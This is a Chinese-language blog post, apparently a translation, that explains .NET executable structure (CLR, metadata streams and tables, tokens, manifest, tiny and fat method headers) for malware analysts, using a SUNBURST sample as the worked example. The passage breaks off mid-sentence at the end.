    <link href="http://example.com/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/</id>
    <published>2024-03-19T03:26:50.783Z</published>
    <updated>2024-04-16T01:33:16.260Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：.Net 可执行文件结构分析（翻译）</p></blockquote><span id="more"></span><p>[toc]</p><h2 id="NET-框架"><a href="#NET-框架" class="headerlink" title=".NET 框架"></a>.NET 框架</h2><p>.NET 软件开发框架和生态系统是由微软在2002年首次发布。旨在提供一个可控的编程环境并且可以在基于Windows操作系统上进行开发、安装和执行。随着 .NET 的发展，.NET5 之后开始支持跨平台开发，并且支持多语言（C#、VB.NET和F#）。</p><p>.NET 框架包含了一个名为 Framenwork Class Library（FCL） 的大型类库，为开发人员提供了从数据访问到加密以及 XML 解析等一系列线程可用、经过测试和优化的功能。由于广泛的支持和托管运行环境使得 .Net 需要更多人工干预的语言和框架。将以上特性结合起来，可以创建一个在桌面、前端、移动设备创建一些列应用程序的高效环境。</p><h2 id="NET威胁环境"><a href="#NET威胁环境" class="headerlink" title=".NET威胁环境"></a>.NET威胁环境</h2><p>相比于 C&#x2F;C++，由于 .NET 用户友好的开发过程、丰富的功能集、以及平滑的 Windows 集成，恶意软件开发人员可能更喜欢 .NET 框架。但是，像 dnSpy 这样的工具使得逆向恶意软件变的很简单，促使了创造这些恶意软件的人使用模糊方法，使得分析更加困难。另外，.NET 的能力是的恶意软件改变其行为或者隐藏使其更难以检测和逆向。虽然 C&#x2F;C++ 允许对系统资源进行更精细的控制，以至于其可能会导致更谨慎和更高效的恶意软件，但是这需要对系统内部工作原理有更深入地了解。这就使得 .NET 更加有吸引力了，因为追求开发速度和易用性的 .NET 是一个更有吸引力选择。</p><p>.NET 威胁环境持续演变，攻击者经常利用适应性强且被广泛采用的 .NET 框架来精心编制和部署各种复杂的威胁。这个框架支撑了许多网络攻击，比如臭名昭著的 Locky 和 Killnet。凭据窃取程序和英航特洛伊木马程序（如CryptoClippy）同样也是基于 .NET 的威胁。此外，用 .NET 编写的破坏性 Wipers 正在不断增加。DoubleZero 以及最近发现的 Hatef Wiper 就是这种趋势的例证。</p><p>此外，.Net 在创建远程访问特洛伊木马（RATs）方面也发挥了重要的作用。例如 QuasarRAT 和 NanoCore，它们因其丰富的功能集以及易于修改和混淆而在地下圈子广受赞誉。此外，.NET 是创建恶意软件加载器的常用工具，这些加载器可以谨慎地安装和执行其他类型的恶意软件。</p><h2 id="NET-编译和运行"><a href="#NET-编译和运行" class="headerlink" title=".NET 编译和运行"></a>.NET 编译和运行</h2><h3 id="编译-托管代码"><a href="#编译-托管代码" class="headerlink" title="编译 - 托管代码"></a>编译 - 托管代码</h3><p>托管语言（C#、F#或VB.NET） 的执行由运行库控制。当合适的语言编译器编译源代码时，输出中间语言（Intermediate Language，IL），也被成为 MSIL(Microsoft Intermediate Language)，托管代码（Managed Code）或者公共中间语言（Common Intermediate Language，CIL）。</p><p>举例说明，当在 .NET 框架下编译 C# 代码时，C# 编译器（csc.exe）的输出是一个 .NET 程序集，该程序集可以是独立程序的可执行文件，也可以是可重用库的动态链接库（DLL）。</p><p>这与编译非托管语言（比如 C&#x2F;C++）不同，在非托管语言中，源代码直接转换为机器码。然后托管代码打包到一个程序集中，并附带一个包含所需元数据的清单。</p><p>托管代码的优美之处在于可移植性和灵活性；同样的程序集可以在 .NET 支持的任何平台上运行，而无需重新编译。此外，托管代码允许跨语言继承代码访问安全性。它提供了后期绑定支持的优势，从而可以在运行时进行解析并调用函数。托管代码和程序集结构提供的这种级别的抽象是 .NET 框架的多功能行和强大功能的基石，使其开发人员能更安全、更易管理、更适时地去开发应用程序。</p><p>下图演示了 .NET 中的编译和执行过程，以 C# 作为演示，但适应于所有的 .NET 语言。</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/NETInfo.png" class="" title=".NET compilation and execution for malware analysis"><h3 id="运行时库-通用语言运行库-The-Common-Language-Runtime-CLR"><a href="#运行时库-通用语言运行库-The-Common-Language-Runtime-CLR" class="headerlink" title="运行时库 - 通用语言运行库(The Common Language Runtime,CLR)"></a>运行时库 - 通用语言运行库(The Common Language Runtime,CLR)</h3><p>通用运行时库是管理 .NET 程序执行的微软 .NET 框架中的一个重要组件。它本质上是提供运行 .NET 应用程序所需的各种服务的执行引擎，而不管这些应用程序是用什么变成语言编写的。</p><p>当一个 .NET 二进制文件被执行时， CLR 开始设置执行环境，但不会立马去把所有的托管语言翻译为原始的机器码。实时编译（Just-In-Time）会在被调用的时候将托管代码转换为机器码。这确保了在特定硬件上的高效执行。此外，.NET Core 和 .NET 5+ 中的  NGEN 和 AOT 编译技术可以在执行托管代码前将其预编译为本机代码，从而进一步提高了性能。</p><p>CLR 的功能超出了应用程序的执行范围；它提供了诸如内存管理、异常处理、垃圾回收、类型安全检查和安全性等关键服务。由 CLR 协调的内存管理抽象了开发人员手动分配和释放内存的需要，显著减少了内存泄漏和相关错误。提供自动的垃圾回收来管理对象生命周期，通过释放应用程序不再使用的对象来回收内存。</p><p>此外，CLR 强制执行严格的类型安全并确保应用程序不会尝试执行不安全或未经验证的操作。它在 .NET 的安全体系结构中也发挥着重要作用，提供代码访问安全性（Code Access Security,CAS），其根据分配给应用程序的信任级别控制程序可以访问那些资源。总体来说，CLR 创建了一个高级别的环境，可以有效减少传统变成语言所需的香醋多低级编程任务，实现了更快的开发周期、更高的生产力和更安全可靠的应用程序。这使得 CLR 成为 .NET 生态系统不可或缺的组件。</p><h3 id="非托管函数"><a href="#非托管函数" class="headerlink" title="非托管函数"></a>非托管函数</h3><p>.NET 框架中的非托管函数是指在 CLR 的托管环境之外运行的代码。这些函数通常用 C 或 C++ 等语言编写，并直接编译成机器特定的代码，绕过 CLR 的管理。这也意味着上述的一些特征如内存管理、垃圾回收等功能是托管环境固有的功能不适用于这些非托管函数。它们主要用于互相操作的目的，允许 .NET 应用程序利用不是与 .NET 程序兼容语言编写的遗留代码或者外部库。当需要使用现有的非 .NET 库或者调用系统级别的 API 时，只能通过非托管代码访问。</p><p>然而，这带来了额外的复杂性和责任，因为开发人员必须手动处理内存泄漏和错误处理，增加了内存泄漏和安全漏洞等问题的可能性。在恶意软件分析的上下文中，了解非托管函数至关重要，因为它们可用于执行绕过托管环境的某校保护措施的代码，从而在分析和检测中带来不一般的挑战。</p><h3 id="非托管函数示例"><a href="#非托管函数示例" class="headerlink" title="非托管函数示例"></a>非托管函数示例</h3><p>要创建使用非托管代码创建一个简单的 .NET 应用程序，可以使用 C# 中的平台调用服务（Platform Invocation Services, PInvoke）。PInvoke 允许托管代码从动态链接库（DLL）中调用非托管函数。</p><p>如下所示为：从 user32.dll 中调用 <code>MessageBox</code> 函数，<code>user32.dll</code> 是一个标准的Windows库。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Importing the MessageBox function from user32.dll</span></span><br><span class="line"></span><br><span class="line">    [<span class="meta">DllImport(<span class="string">&quot;user32.dll&quot;</span>, CharSet = CharSet.Unicode)</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">int</span> <span class="title">MessageBox</span>(<span class="params">IntPtr hWnd, String text, String caption, <span class="built_in">uint</span> type</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calling the MessageBox function - this is an unmanaged function call</span></span><br><span class="line"></span><br><span class="line">        MessageBox(<span class="keyword">new</span> IntPtr(<span class="number">0</span>), <span class="string">&quot;Hello, World!&quot;</span>, <span class="string">&quot;Message Box&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单说明一下上述代码：</p><ol><li>首先从 <code>user32.dll</code> 中使用 <code>DllImport</code> 属性导入 <code>MessageBox</code> 函数。 这一步非常关键，主要是告诉 CLR 这个函数是一个外部函数，而非 .NET 运行时库函数。</li><li><code>MessageBox</code> 的声明与 user32.dll 中的非托管函数一致。</li><li>在 <code>Main</code> 函数中， 调用 <code>MessageBox</code> 函数， 参数包括一个窗口句柄（示例传递的 <code>IntPtr(0)</code>）、一个文本（<code>Hello, World!</code>）、一个窗口标题（<code>Message Box</code>）、以及一个消息框类型参数 （0，0 指最简单的只有一个确认按钮的窗口）。</li><li>当程序被运行，将在屏幕上显示一个窗口。</li></ol><h3 id="NET-程序集"><a href="#NET-程序集" class="headerlink" title=".NET 程序集"></a>.NET 程序集</h3><p>.NET 程序集是 .NET 应用程序的基本构成，用作一个或多个代码模块或资源文件的集合。生成的程序集的内容包括以下三个部分：</p><ul><li><a href="https://learn.microsoft.com/en-us/dotnet/standard/managed-code#intermediate-language--execution">Intermediate Language, IL</a>：IL 是一个与 CPU 无关的指令集，它使相同的程序集能够在 .NET 框架支持的不同平台上执行。</li><li><a href="https://learn.microsoft.com/en-us/dotnet/standard/metadata-and-self-describing-components">Metadata</a>：它描述了由 CLR 管理的结构元素，如程序集、类型（类、接口、枚举、结构体），方法等等。这包括调试、垃圾回收、安全属性所需的信息以及运行库管理代码所需的详细信息。</li><li><a href="https://learn.microsoft.com/en-us/dotnet/standard/assembly/manifest">Manifest</a>: 是描述程序集本身的元数据的特定部分。它包括程序集的名称、版本、区域性，还可能包括唯一标识程序集的强名称。元数据描述程序集内的内从，而清单文件提供程序集整体的高级别概述，以确保程序集与其所依赖的其他正确版本的程序集交互。</li></ul><h2 id="NET-可执行文件格式分析"><a href="#NET-可执行文件格式分析" class="headerlink" title=".NET 可执行文件格式分析"></a>.NET 可执行文件格式分析</h2><p>在这一部分，将对 .NET 内层进程分析。作者使用一个示例（The Notorious SubBurst）来演示所涉及到的概念，以便于能理解。</p><p>示例：<a href="https://analyze.intezer.com/files/32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77?_gl=1*1s5gddk*_gcl_au*MTMzNzUwNTcyNi4xNzEwNDk3NjQx">Malicious SUNBURST b91ce2fa41029f6955bff20079468448 - Intezer</a></p><p>文件hash: 32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77</p><p>使用到的工具有 <a href="https://github.com/dnSpy/dnSpy">dnSpy</a>、 <a href="https://github.com/icsharpcode/ILSpy">ILSpy</a>、 和 <a href="https://www.winitor.com/download">PEStudio</a> 。(这里建议大家实际操作去打开一个 C# 编译的 dll 查看一下)</p><p>（由于资源下载的缘故，我没法拿到样本进行展示，看看原作者的分析内容吧）</p><p>在 .NET 程序集上下文的运行时标头指定了由 CLR 使用的 PE 文件格式中的基本元素，包含了 CLR 正确执行该 .NET 程序集所需的元数据和关键详细信息。该运行时标头是 PE 文件标头中的第 15 个数据目录条目，也被成为 CLR 运行时标头（CLR 头）。</p><p>数据目录是 PE 文件中的索引或目录，列出了重要部分，并提供了各个部分的位置和大小，这个结构提供对 PE 文件不同部分的高效访问，例如导入和导出表、资源、CLR 运行时头等。</p><p>如下所示条目描述了运行时标头的相对虚拟地址及其大小，从而将 CLR 引导到此标头来管理 .NET 程序集在加载时如何执行。</p><p>截图的第15个条目表是 .NET 的相关信息。</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/smaple_pe.png" class="" title="PeStudio 分析的 .NET 文件"><p>接下来的部分，作者主要介绍了 PE 结构、元数据头及之前的关系。</p><p>元数据头管理了文件内容。它提供了一个分类目录来列出每一块数据的大小、以及偏移量。当 CLR 或者如 dnSpy 或者 ILDasm 这些工具需要访问一段元数据的时候，它会查询元数据头以找到合适的文件流。然后，它导航到该流中的正确位置以读取数据。</p><p>接下来，就是分析说明 .NET 元数据头中的各个关键字。</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-6.png" class="" title="img"><ul><li><p>Signature: 签名、所有的 .NET 元数据头签名都是 BSJB (0x42534a42)</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20240415153157258.png" class="" title="BSJB 示例"></li><li><p>GUID：长度为 128bits 的唯一标识</p></li><li><p>IL-Only：这个标志指明程序集只包含中间语言（IL）代码，而不包含特定于CPU的本机代码。PE 可以同时包含托管代码和非托管代码。</p></li><li><p>32-bit-required: 设置这个标志时，表示程序需要32位运行库，即使运行在64为操作系统上。它通常用于依赖于32为本机依赖项或32位运行时的特定行为的程序集。</p></li><li><p>Strong Name Signed: 强签名。指示程序集是否已使用强签名。强命名涉及使用公钥&#x2F;私钥对程序集进行签名，提供唯一标识并确保程序集未被篡改。</p></li><li><p>存储流（Streams）是指包含特定类型的元数据的结构化数据段，.NET 程序集元数据的关键流包括：</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20240322101133647.png" class="" title="image-20240322101133647"><ul><li>#~（Tilde）Stream：主元数据块包含元数据表。这些表存储有关程序集中定义的<u>类型、方法、字段、参数和其他元素</u>的信息。波浪线数据块是根据 CLI 规范定义的元数据表模式构造的。</li><li>#Strings Stream: 这个数据块存储元数据使用的字符串，比如<u>类型名称、方法名称和字段名称</u>^这块内容在后文会用到^。元数据表（#~数据块中）的引用指向了当前数据流中实际字符串的偏移量。</li><li>#US(User Strings) Stream: 这个数据块保存程序集中使用的文本字符串值，如代码中的字符串变量或字符串常量的默认值。元数据引用这些字符串，特别是在加载字符串文字的指令中。</li><li>#GUID Stream: 包含程序集使用的GUID。固定大小为 0x10，此数据块中的每个条目都是一个GUID，用于标识元数据的某些方面，如模块版本的ID(MVID)。</li><li>#Blob Stream: “Binary Large Object” 数据块。存储用于各种情况的二进制数据，比如字段的默认值、方法签名、属性签名和封送处理信息。元数据表中的项引用此数据块以获取详细的二进制信息。</li><li>#Pdb Stream: 可选数据块，包括元数据和 IL 代码与源文件以及和文件相关联的调试信息。</li></ul></li></ul><p>在不同的 .NET 程序集查看到的内容可能不太一样，ILSpy 会展示 元数据 的各个组成部分，dnSpy 则会解析为一个 PE 文件。</p><h3 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h3><p>Metadata 在 .NET 中就是一组描述程序结构及其特点的二进制数据。包含了代码中定义的类型（类、接口、枚举等），成员定义（方法、属性、字段、事件）引用类型和成员以及程序集本身的信息。</p><p>在存储次描述性信息的 PE 文件中，元数据被划分为几个表，统称为元数据表。每个表都遵循一个特定的模式，该模式概述其包括的数据结构和性质。以下是可以在元数据表中能找到的一些关键类型的信息：</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20240411173115834.png" class="" title="image-20240411173115834"><p><strong>定义表（Definition Table）：</strong>包含有关在当前程序集中定义的代码的信息。包括以下几个表：</p><ul><li>类型定义表（<em>TypeDef Table</em>）： 源代码中定义的每个类或接口的详细信息，包括其名称、可见性、基类型以及它包含的方法或属性。主要关键字包括：<ul><li>类型名：类型的名称</li><li>命名空间：该类型所属的命名空间</li><li>基础类型：Typedef、TypeRef 或 TypeSpec 表的索引，指示类型的基类。</li><li>标志位：描述类型属性（可视化，抽象&#x2F;封装状态，等）</li></ul></li><li>方法定义表（<em>MethodDef Table</em>）：每个方法的详细信息，包括其名称、签名（参数和返回类型）以及与其相关的 IL 代码。主要关键字为以下几个：<ul><li>名称：方法名</li><li>签名：指向方法名称的 blob 索引，其中包括方法的调用约定、返回类型和参数。</li><li>相对虚拟地址（RVA）：相对虚拟地址，指向方法实现在PE文件中位置。</li></ul></li><li>关键字定义表（<em>FieldDef Table</em>）: 描述每一个关键字（类成员变量），包括名称和类型，关键字如下所示：<ul><li>名称：关键字名称</li><li>签名，指向关键字的类型签名的 blob 索引</li><li>标志位：指定字段属性，如可见性、静态&#x2F;实例，和仅初始化（只读）。</li></ul></li></ul><p>**引用表(Reference Tables)**：包含程序集外部但又程序集引用的代码信息，包含以下内容：</p><ul><li>类型引用表（<em>TypeRef Table</em>）: 当前程序集引用的其他程序集中定义的类型的信息</li><li>成员引用表（<em>MemberRef Table</em>）：描述定义在其他模块或程序集的成员（方法、属性等）</li></ul><p><strong>清单元数据表（Manifest Metadata Table）</strong>：描述程序集本身，包含以下内容：</p><ul><li>程序集表（<em>Assembly Table</em>）：关于程序集本身的一些信息，如名字，版本，已经强强签名校验。</li><li>应用程序集表（<em>AssemblyRef Table</em>）：描述当前程序集依赖的其他程序集，包括他们的名称、版本、公钥（如何是强名称的）</li></ul><p><strong>模块表（<em>Module Table</em>）</strong>：关于当前模块的一些信息，如模块名、用于标识唯一性的GUID</p><p><strong>自定义属性表（<em>CustomAttribute Table</em>）</strong>：包含程序集中用于不同元素的自定义属性的详细信息。</p><p><strong>事件表和属性表（<em>Event Table and Property Table</em>）</strong>：描述在类型中声明的事件和属性。</p><p><strong>参数表（<em>Param Table</em>）</strong>：关于各函数参数的信息。</p><p><strong>独立签名表（<em>StandAlonesig Table</em>）</strong>：独立签名可用于封装类型或方法签名。</p><p><strong>常量表（Constant Table）</strong>：存储代码中定义的常量。</p><p>这些表对于 CLR 的操作至关重要，因为它们提供了执行程序集所需的上下文信息。在运行时读取他们以执行各种任务，如类型实例化、方法调用、安全验证等。</p><p>这些元数据表以高度优化的二进制格式编码，运行时可以有效地处理这些格式。通过反射，还可以以编程方式访问元数据，并且允许 .NET 应用程序在运行时检查自己跌结构或其他程序集的结构。这种内省能力支持 .NET 框架支持一系列动态编程。</p><h4 id="元数据唯一标识（Metadata-Unique-Identidier-ID）"><a href="#元数据唯一标识（Metadata-Unique-Identidier-ID）" class="headerlink" title="元数据唯一标识（Metadata  Unique Identidier,ID）"></a>元数据唯一标识（Metadata  Unique Identidier,ID）</h4><p>元数据标记是 CLR 用于引用程序集的元数据表中的元数据元素的唯一标识符。这些表的每个条目都被分配了一个元数据标记，作为对该特定条目的稳定引用。</p><p>元数据标记对于 CLR 与已编译代码进行交互至关重要，因为它们为运行时库提供了有效的标识和访问元数据的方法。PE文件中的每个类型、成员、签名或其他元数据描述符都具有相应的标记。</p><p>在 dnSpy 中，每个方法在其声明之上都包含一个注释，信息包括令牌、RID、RVA 和文件偏移量。如下所示屏幕截图：</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image.png" class="" title="img"><p>看一些各个字段的含义：</p><ol><li>标记（Token）: 元数据标记的高字节（big-endian）指定元数据的类型，以便于运行时识别。它指示令牌引用的元数据中的那个表（TypeDef、TypeRef、MethodDef等）。有关令牌类型的值得我更多信息可以参见附录A。</li><li>行索引（Row Index,RID）：元数据标记的其余24位用于索引相关的元数据表。它们指示可以在哪里找到此元素的实际元数据的行号。由于每个表可以有数百万个条目，因此24位允许有足够范围的索引。</li><li>相对虚拟地址（RVA）: 相对虚拟地址是函数实体（编译的 IL 代码）相对于程序被加载到内存的基地址的地址。例如，0x00023B28 意味着该函数的 IL 代码从加载模块的基地址的内存偏移大小。CLR 使用 RVA 在运行时定位并执行函数代码。在 PE 文件的上下文中，该文件的格式用于windows平台的 .NET 程序集，当文件加载到内存后，RVA 被广泛用于引用文件的各个部分。</li><li>文件偏移（File Offset）: 这个值表示当前函数的 IL 代码在 .NET 程序集（.dll 或 .exe 文件）中的实际位置。0x00021D28 表示从文件开始到函数代码开始的位置的偏移量（以字节为单位）。这对于直接对程序集文件进行二进制分析或操作非常有用，因为它能准确的告诉你在文件中哪里可以找到该方法的代码。</li></ol><p>元数据标记的结构在运行时解析引用提高了 CLR 的性能。例如，当 JIT 编译器需要将 IL 编译成本机代码时，它使用元数据标记来查找方法签名、类型信息等。元数据令牌系统还支持 CLR 的动态特性，比如反射。它允许有效地执行各种运行时服务，如类型安全、安全检查和跨语言互操作性。</p><h4 id="元数据表示例"><a href="#元数据表示例" class="headerlink" title="元数据表示例"></a>元数据表示例</h4><p>如下所示为 SolarWinds 恶意软件的启动函数。</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/start_function-1530x404.png" class="" title="dnSpy 中 Start 函数中的token和RID字段"><p>标记的高位（0x6）值为6，对应元数据表6，即方法定义表（MethodDef Table）。</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-20240415120242760.png" class="" title="表流 方法表"><p>标记的下半部分是 0x5FA，是其在 MethodDef Table 中的条目号。如下所示：</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/full_start_metadata-1530x676.png" class="" title="img"><p>检查 Start 函数的元数据的下半部分，值 0x00058D66 是从可执行文件开始的偏移量，偏移量（0x1EC15）的值在 字符串流（#String stream） 中，它将包含方法名称：Start。如下所示是在 dnSpy 的 Hex 编辑器中的数据：</p><blockquote><p>这里找 <code>Start</code> 函数在 #Strings 流中位置时，需要按照 Method 的索引来查找。hex(1530) &#x3D; 0x5FA，前文提到了 Strings 流的组成，所以在查找 <code>Start</code> 方法时，需要中 Strings 流中的方法名开始（Method），索引为 <code>0x5FA</code>。</p></blockquote><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-1.png" class="" title="img"><p>字符串流中偏移量的值如上所示。dnSpy 会自动检测字符串的值。</p><p>要查看 String 流中的数据，需要执行以下操作：</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-4.png" class="" title="img"><p>在新窗口中，转到偏移量（相对于 字符串流基地址）并查看我们正在寻找的字符串 - Start。</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/string-1530x425.png" class="" title="Start 字符串在Strings Stream 中的偏移"><h3 id="Manifest（清单）"><a href="#Manifest（清单）" class="headerlink" title="Manifest（清单）"></a>Manifest（清单）</h3><p>.NET 清单是 .NET 程序集的关键部分，描述程序集中的元素如何彼此关联。它嵌入在每个程序集中，无论它是静态的还是动态的，并且包含程序集操作所需的基本数据，包括其版本要求、安全标识、范围定义以及对资源和类的引用的解析。</p><p>.NET 清单的主要功能是提供全面的元数据描述，以便于组件的识别、版本控制和依赖管理。它确保程序集是自描述的，有助于解析类型引用并将这些引用映射到包含其声明和实现的文件。这对于维护版本控制以及确保不同程序集合依赖它们的组件之间的兼容性尤为关键。</p><h4 id="NET-清单文件内容"><a href="#NET-清单文件内容" class="headerlink" title=".NET 清单文件内容"></a>.NET 清单文件内容</h4><p>清单包括对程序集的标识和操作至关重要的各种信息：</p><ul><li>程序集名称：指定程序集名称的文本字符串</li><li>版本号：包括主版本号和次版本号，以及修订版本号和构建版本号，供通用语言运行库用于执行版本策略。</li><li>语言及区域信息：指定程序集支持的语言和区域，对于包含区域性语言特定信息的附属程序集尤为重要。</li><li>程序集中的文件列表：包括程序集中包含的每个文件及其名称的散列，以确保完整性和程序集的完整性。</li><li>类型应用信息：运行时用于将类型引用映射到其声明和实现的文件，这对类型安全性和正确性至关重要。</li><li>引用程序集信息：列出当前程序集静态引用的其他程序集，包括它们的名称、元数据（如版本号、语言、操作系统）以及如果有强命名时的公钥</li></ul><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/manifest-1530x835.png" class="" title="img"><h3 id="函数体结构"><a href="#函数体结构" class="headerlink" title="函数体结构"></a>函数体结构</h3><p>.NET 函数体结构可以编码为 “Tiny” 格式和 “Fat”格式，根据函数的复杂性和需求，每种格式用于不同的目的。在 Tiny 头和 Fat 头之间的选择是有 .NET 编译器基于所编译函数的复杂性决定的。</p><p>Tiny 头（The Tiny header）是两种格式中较简单的一种。当一个方法满足特定的条件时，就会使用这个header：</p><ul><li>函数体小于 64 bytes</li><li>堆栈深度不会超过8槽（堆栈上的每个条目都有一个槽，与条目的大小无关）</li><li>不包含本地变量或结构化异常处理程序（SEH）</li></ul><p>Tiny 头更加紧凑，并且针对小型函数进行了优化。</p><p>Tiny 头是一个单字节长度，下面的 2 bits 设置为 <code>0x2</code>（二进制 10），表示它是一个 Tiny 头，剩下的 6 bits 表示函数提的大小。这种紧凑的格式允许有效地存储小型函数体，减少了简单方法的元数据开销。</p><table><thead><tr><th>Field</th><th>Size(Bits)</th><th>Description</th></tr></thead><tbody><tr><td>Header Flag</td><td>2</td><td>在 Tiny 头中总是被设置为 <code>10</code>(二进制)</td></tr><tr><td>Method Size</td><td>6</td><td>指定函数体的大小（以字节为单位，最大为 63 bytes）</td></tr></tbody></table><p>Fat 头（The Fat header）用户更复杂的函数主题，超过了 Tiny 头的限制：</p><ul><li>Fat 头用于不符合 Tiny 头标准的较大函数</li><li>它提供了其他信息，比如方法的局部变量和 SEH</li><li>当一个函数的大小或者复杂度超过了 Tiny 头的显示，就会使用 Fat 头。</li></ul><p>Fat 头更大，由多个字段组成，包括一个标志字段，用于指示方法函数体的其他特征（例如异常处理或局部变量初始化）。</p><table><thead><tr><th>Field</th><th>Size(Bits)</th><th>描述</th></tr></thead><tbody><tr><td>Flags</td><td>2</td><td>指定函数图的属性，包括是否存在局部变量、初始局部变量等。最低位（0x3）在设置为 1 时表示 Fat 头。</td></tr><tr><td>Size</td><td>2</td><td>4 byte 大小的头。包括整个头部的大小，不仅仅是函数体的大小</td></tr><tr><td>MaxStack</td><td>2</td><td>方法执行期间操作数堆栈上任何点上的最大项数</td></tr><tr><td>CodeSize</td><td>4</td><td>函数体 IL 代码的大小（byte）</td></tr><tr><td>LocalVarsigTok</td><td>4</td><td>用于局部变量签名的元数据标记，仅当方法具有局部变量时才显示</td></tr><tr><td>MoreSections</td><td>N</td><td>例如异常处理子句的附件部分，如果在标志中指定，则显示。</td></tr></tbody></table><p>想看更多字段说明，可以看 <a href="https://www.ntcore.com/files/dotnetformat.htm#:~:text=the%20Method%20format.-,Methods,-Every%20method%20contained">The .NET File Format</a></p><h4 id="函数体示例"><a href="#函数体示例" class="headerlink" title="函数体示例"></a>函数体示例</h4><p>如下所示为 <code>DeleteDiscoveryProfileInternal</code> 函数：</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/fat_header_function-1530x833.png" class="" title="img"><p>点击偏移量（或 RVA）将会条传到 HEX 窗口中函数的头部：</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/fat_header-1-1530x426.png" class="" title="img"><p>在这里，我们可以看到 dnSpy 在鼠标悬停在头部字节上时突出显示了头部字段。函数的内容-指令跟在头部后面，在 dnSpy 中表示为 